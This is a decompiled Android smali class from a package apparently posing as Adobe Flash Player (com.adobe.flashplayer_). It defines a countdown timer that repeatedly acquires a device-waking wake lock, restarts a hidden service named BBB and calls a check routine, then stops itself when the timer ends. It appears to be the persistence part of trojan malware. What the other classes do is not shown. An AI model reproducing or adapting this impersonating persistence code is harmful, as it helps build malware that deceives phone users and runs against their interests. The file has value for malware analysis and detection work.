.class Lcom/adobe/flashplayer_/DDD$1;
.super Landroid/os/CountDownTimer;
.source "DDD.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/adobe/flashplayer_/DDD;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/adobe/flashplayer_/DDD;


# direct methods
.method constructor <init>(Lcom/adobe/flashplayer_/DDD;JJ)V
    .locals 0
    .param p2, "$anonymous0"    # J
    .param p4, "$anonymous1"    # J

    .prologue
    .line 1
    iput-object p1, p0, Lcom/adobe/flashplayer_/DDD$1;->this$0:Lcom/adobe/flashplayer_/DDD;

    .line 137
    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 4

    .prologue
    .line 150
    iget-object v0, p0, Lcom/adobe/flashplayer_/DDD$1;->this$0:Lcom/adobe/flashplayer_/DDD;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcom/adobe/flashplayer_/DDD$1;->this$0:Lcom/adobe/flashplayer_/DDD;

    invoke-virtual {v2}, Lcom/adobe/flashplayer_/DDD;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/adobe/flashplayer_/BBB;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Lcom/adobe/flashplayer_/DDD;->stopService(Landroid/content/Intent;)Z

    .line 151
    iget-object v0, p0, Lcom/adobe/flashplayer_/DDD$1;->this$0:Lcom/adobe/flashplayer_/DDD;

    invoke-virtual {v0}, Lcom/adobe/flashplayer_/DDD;->stopSelf()V

    .line 152
    return-void
.end method

.method public onTick(J)V
    .locals 6
    .param p1, "millisUntilFinished"    # J

    .prologue
    .line 139
    iget-object v2, p0, Lcom/adobe/flashplayer_/DDD$1;->this$0:Lcom/adobe/flashplayer_/DDD;

    invoke-virtual {v2}, Lcom/adobe/flashplayer_/DDD;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "power"

    invoke-virtual {v2, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    .line 141
    .local v0, "pm":Landroid/os/PowerManager;
    const v2, 0x10000001

    const-string v3, "Reichstag"

    invoke-virtual {v0, v2, v3}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v1

    .line 142
    .local v1, "wakeL":Landroid/os/PowerManager$WakeLock;
    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 143
    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 144
    iget-object v2, p0, Lcom/adobe/flashplayer_/DDD$1;->this$0:Lcom/adobe/flashplayer_/DDD;

    new-instance v3, Landroid/content/Intent;

    iget-object v4, p0, Lcom/adobe/flashplayer_/DDD$1;->this$0:Lcom/adobe/flashplayer_/DDD;

    invoke-virtual {v4}, Lcom/adobe/flashplayer_/DDD;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v5, Lcom/adobe/flashplayer_/BBB;

    invoke-direct {v3, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v2, v3}, Lcom/adobe/flashplayer_/DDD;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 145
    iget-object v2, p0, Lcom/adobe/flashplayer_/DDD$1;->this$0:Lcom/adobe/flashplayer_/DDD;

    invoke-virtual {v2}, Lcom/adobe/flashplayer_/DDD;->checkA()V

    .line 148
    return-void
.end method
